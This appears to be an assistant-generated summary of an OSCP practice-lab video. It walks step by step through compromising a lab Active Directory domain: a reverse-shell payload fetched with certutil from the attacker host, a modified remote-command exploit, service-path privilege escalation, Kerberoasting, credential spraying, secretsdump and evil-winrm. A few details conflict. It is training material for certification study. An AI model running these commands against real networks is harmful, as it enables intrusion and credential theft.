@@ -1,0 +1,143 @@
+Here are the commands and key lessons from the "OSCP Practice Lab: Active Directory Attack Path #1" video for your OSCP exam preparation, focusing on the steps to compromise an Active Directory environment:
+
+### Initial Setup and Reconnaissance
+
+* **VPN Connection**:
+    * Download the `.ovpn` profile from the lab control panel.
+    * Organize files into folders (e.g., `active_directory_lab/vpn`, `ms01`, `ms02`, `dc01`).
+    * Connect to the VPN: `openvpn <profile_name>.ovpn`.
+* **Update `/etc/hosts` File**:
+    * Add target IP addresses and hostnames to `/etc/hosts` for easier access via DNS names.
+        * `192.168.100.201` ms01
+        * `10.10.10.202` ms02
+        * `10.10.10.200` dc01
+* **Organize Target Folders**:
+    * Create subfolders for `enu` (enumeration logs), `loot` (flags), `files` (downloaded files), and `exploits` (exploit scripts) within each target's directory (e.g., `ms01/enu`).
+* **Nmap Scan (ms01)**
+    * Initial quick scan for all ports: `sudo nmap -t4 -p- -v ms01 -oN enu/nmap_all_ports.log`
+    * **Lesson**: Even if ping doesn't respond, ports might still be open (e.g., 443, 80).
+    * Targeted scan with service detection and default scripts for open ports: `sudo nmap -sV -sC -p80,443,1978-1980 ms01 -oN enu/nmap_services.log`
+        * **Identified Services**: Apache 2.4.56 on ports 80 and 443; unknown services on 1978-1980.
+* **Gobuster Directory Brute-Forcing (ms01)**
+    * `gobuster dir -u http://ms01 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 50 -o enu/gobuster_80.log`
+        * **Discovered Directories**: `/dashboard`, `/images`, `/uploads`
+        * **Discovered File**: `/index.php`
+
+### Gaining Initial Foothold (ms01)
+
+* **Web Enumeration (ms01)**
+    * Access `http://ms01/dashboard` in a browser, revealing Zamp for Windows.
+    * Access `http://ms01/dashboard/phpinfo.php`, revealing `C:\xampp\htdocs` as the document root and PHP version.
+    * Access `http://ms01/uploads`, revealing a downloadable executable file with a random name (e.g., `32b2f0a1c1d4d8e8b0a0a0a0.exe`).
+* **Analyze Downloaded Executable**:
+    * Download the file and move to `files/`: `mv <downloaded_file> files/`
+    * Use `exiftool` to inspect metadata: `exiftool <downloaded_file>`
+        * **Discovered Software**: "Remote Mouse" version 3.008
+* **Searchsploit for "Remote Mouse"**:
+    * `searchsploit "remote mouse"`
+    * Refine search: `searchsploit "remote mouse 3.008"`
+    * **Discovered Exploit**: Remote Mouse 3.008 - Unauthenticated Remote Command Execution (Python 2 script: `46697.py`)
+* **Generate Payload (ms01)**
+    * Create a payloads directory: `mkdir payloads`
+    * Generate a Windows 64-bit reverse TCP shell: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=172.16.11.11 LPORT=443 -f exe -o payloads/win_rev_443.exe`
+        * **Lesson**: Use a known open port (like 443) for the LPORT to bypass potential firewalls.
+    * Start a Python web server to host the payload: `python3 -m http.server 80` (or `python2 -m SimpleHTTPServer 80`)
+* **Modify and Execute Remote Mouse Exploit (ms01)**
+    * Copy the exploit: `searchsploit -m 46697.py`
+    * Edit `46697.py` (or a copy):
+        * Change `pop_calc` function.
+        * Replace `calc.exe` with `certutil.exe -urlcache -f http://172.16.11.11/win_rev_443.exe C:\Users\Public\win_rev_443.exe` to download the payload.
+        * Run the modified exploit with Python 2: `python2 46697.py ms01`
+        * **Lesson**: The exploit simulates mouse movements and keyboard input. Pay attention to how it interacts with the Windows GUI (e.g., clicking the Start menu, typing commands).
+    * Wait for the web server to show a 200 OK for the payload request.
+    * Modify the exploit again to execute the downloaded payload:
+        * Change the command to `C:\Users\Public\win_rev_443.exe`.
+    * Set up a Netcat listener: `nc -nvlp 443`
+    * Run the modified exploit to execute the payload.
+    * **Lesson**: Be patient; GUI-based exploits can be slow.
+* **Initial Shell (ms01)**
+    * Check user: `whoami` (should be `lucy` on `ms01`)
+    * Check privileges: `whoami /priv` (look for `SeShutdownPrivilege` which allows rebooting)
+    * Check local users: `net user`
+    * Check local admins: `net localgroup administrators` (revealed domain admins, confirming domain join)
+
+### Privilege Escalation (ms01)
+
+* **Transfer WinPEAS to ms01**:
+    * Download WinPEAS (e.g., `winPEASx64.exe`) from GitHub.
+    * Host it on your Python web server.
+    * Download on ms01 using `certutil`: `certutil.exe -urlcache -f http://172.16.11.11/win.exe C:\Users\Public\win.exe`
+    * Execute WinPEAS: `C:\Users\Public\win.exe`
+* **WinPEAS Analysis and Unquoted Service Path (ms01)**
+    * **Lesson**: Prioritize red findings, but be thorough. Look for specific vulnerabilities.
+    * **Discovered Vulnerability**: "Wise Boot Assistant" service (Unquoted Service Path)
+        * The service path is `C:\Program Files (x86)\Wise Care 365\Wise Boot Assistant.exe`.
+        * Writable permissions on `C:\Program Files (x86)\Wise Care 365\`.
+        * **Lesson**: An unquoted service path with write permissions in an earlier directory allows placing an executable (e.g., `Wise.exe`) that will be executed before the legitimate service.
+* **Exploiting Unquoted Service Path (ms01)**
+    * Copy your `win_rev_443.exe` payload to `C:\Program Files (x86)\Wise.exe` using the existing shell: `copy C:\Users\Public\win_rev_443.exe "C:\Program Files (x86)\Wise Care 365\Wise.exe"` (note the double quotes for the path with spaces)
+    * Set up a Netcat listener on your Kali machine (port 443).
+    * Reboot ms01: `shutdown /r /t 1`
+    * **Lesson**: If you have `SeShutdownPrivilege`, you can reboot the machine to trigger service startup exploits.
+* **Privileged Shell (ms01)**
+    * Check user: `whoami` (should be `nt authority\system` on `ms01`)
+    * **Loot**: Find `local.txt` (under `C:\Users\Lucy\Desktop`): `dir /s /b C:\Users\*.txt | findstr /i local.txt`
+    * **Loot**: Find `proof.txt` (under `C:\Users\Administrator\Desktop`): `dir /s /b C:\Users\*.txt | findstr /i proof.txt`
+
+### Active Directory Reconnaissance
+
+* **Find AD Breadcrumbs (ms01 as System)**
+    * Enumerate users' Powershell history for credentials: `type C:\Users\WildStyle\Documents\WindowsPowerShell\PSReadline\ConsoleHost_history.txt`
+    * **Discovered Credentials**: `wildstyle` with password `Awesome24!`
+* **Kerberoasting and AS-REP Roasting (from Kali)**
+    * Create `users.txt` and `passwords.txt` from extracted credentials.
+    * **Kerberoasting**: `impacket-GetUserSPNs -request -dc-ip 10.10.10.200 'ocp.lab/wildstyle' -k` (This needs correction from the video where they struggle with syntax)
+        * **Discovered Hash**: for `serviceaccount`
+    * **AS-REP Roasting**: `impacket-GetNPUsers -request -dc-ip 10.10.10.200 'ocp.lab/wildstyle'`
+        * **Discovered Hash**: for `metalbeard`
+    * **Crack Hashes with Hashcat**:
+        * `hashcat -m 18200 -a 0 <asrep_hash_file> /usr/share/wordlists/rockyou.txt` (for AS-REP)
+        * `hashcat -m 13100 -a 0 <kerberos_hash_file> /usr/share/wordlists/rockyou.txt` (for Kerberos)
+        * Add rulesets for better cracking: `-r /usr/share/hashcat/rules/best64.rule`
+        * **Cracked Password**: `Portland7@` for `serviceaccount`
+* **SMB Enumeration with New Credentials (Kali)**
+    * `crackmapexec smb 10.10.10.200 -u users.txt -p passwords.txt --continue-on-success` (using `serviceaccount` and `wildstyle` credentials)
+        * **Discovered Admin**: `emt` for `ms02`
+    * `smbclient \\\\10.10.10.200\\backups -U 'OCP.LAB\serviceaccount%Portland7@'`
+        * **Discovered File**: `it-users.zip`
+    * Download and crack `it-users.zip`:
+        * `zip2john it-users.zip > it-users.hash`
+        * `john --wordlist=/usr/share/wordlists/rockyou.txt it-users.hash`
+        * **Cracked Password**: `tbrick14`
+        * Extract `it-users.zip` with the password `tbrick14`.
+        * **Discovered Credentials (in text file)**: New set of usernames and passwords.
+    * Use `cut` to separate users and passwords:
+        * `cat it_users.txt | cut -d ':' -f 1 > users.txt`
+        * `cat it_users.txt | cut -d ':' -f 2 > passwords.txt`
+    * Spray new credentials (from `it_users.txt`) against `dco1` and `ms02`: `crackmapexec smb 10.10.10.200,10.10.10.202 -u users.txt -p passwords.txt --continue-on-success`
+        * **Discovered Admin**: `emt` on `ms02` with admin privileges
+
+### Lateral Movement and Domain Ownage
+
+* **Lateral Movement to ms02 (from Kali using impacket-psexec)**
+    * `impacket-psexec OCP.LAB/emt:'RexRules@123' @10.10.10.202` (using the cracked `emt` password)
+        * **Lesson**: PSExec can provide a shell as `NT AUTHORITY\SYSTEM` on the target machine, bypassing local privilege escalation.
+* **Find Domain Admin Credentials (ms02 as System)**
+    * Enumerate domain users: `net user /domain`
+    * Enumerate a specific domain user: `net user LordBusiness /domain` (revealed `LordBusiness` is a `Domain Admin`)
+    * Dump cached credentials from `ms02` remotely using `impacket-secretsdump`
+        * `impacket-secretsdump -sam -system -security -ntds -dc-ip 10.10.10.200 'OCP.LAB/emt:RexRules@123'@10.10.10.202` (Video syntax has many errors, correct usage shown here)
+        * **Discovered Credentials**: `LordBusiness` with plaintext password `TacosTuesday`
+* **Domain Admin Shell on dco1 (from Kali using evil-winrm)**
+    * `evil-winrm -i 10.10.10.200 -u LordBusiness -p 'TacosTuesday'`
+        * **Lesson**: `evil-winrm` is preferred for domain controllers as it often provides better capabilities than PSExec.
+* **Final Loot (dco1 as Domain Admin)**
+    * Navigate to the administrator's desktop: `cd C:\Users\Administrator\Desktop`
+    * Retrieve `proof.txt`: `type proof.txt`
+    * Screenshot `whoami`, `ipconfig`, `hostname` for final submission.
+
+**Lesson**: Always take good notes throughout the process, including hostnames, IPs, credentials, discovered vulnerabilities, and the path to compromise.
+
+**Video Reference**: [OSCP Practice Lab: Active Directory Attack Path #1](https://www.youtube.com/watch?v=gY_9Dncjw-s)
+
+http://googleusercontent.com/youtube_content/6
